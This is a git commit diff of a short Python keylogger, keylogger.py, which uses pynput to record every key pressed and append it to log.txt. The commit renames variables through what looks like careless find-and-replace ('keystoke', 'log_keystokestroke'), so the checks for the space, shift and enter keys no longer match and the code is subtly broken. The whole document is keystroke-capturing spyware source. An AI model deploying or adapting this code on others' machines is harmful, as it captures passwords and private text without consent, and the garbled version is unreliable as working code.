e430a621e1a96904d9861ce565da13b663077fa2
Gourav2000 <gouravsarkar67@gmail.com>
2020-12-13 17:22:01 +0530

    v1

--- keylogger.py
+++ keylogger.py
@@ -1,17 +1,17 @@
 from pynput.keyboard import Listener
 
-def log_keystroke(key):
-    key = str(key).replace("'", "")
+def log_keystokestroke(keystoke):
+    keystoke = str(keystoke).replace("'", "")
 
-    if key == 'Key.space':
-        key = ' '
-    if key == 'Key.shift_r':
-        key = ''
-    if key == "Key.enter":
-        key = '\n'
+    if keystoke == 'keystoke.space':
+        keystoke = ' '
+    if keystoke == 'keystoke.shift_r':
+        keystoke = ''
+    if keystoke == "keystoke.enter":
+        keystoke = '\n'
 
-    with open("log.txt", 'a') as f:
-        f.write(key)
+    with open("log.txt", 'a') as file:
+        file.write(keystoke)
 
-with Listener(on_press=log_keystroke) as l:
-    l.join()
+with Listener(on_press=log_keystokestroke) as lis:
+    lis.join()
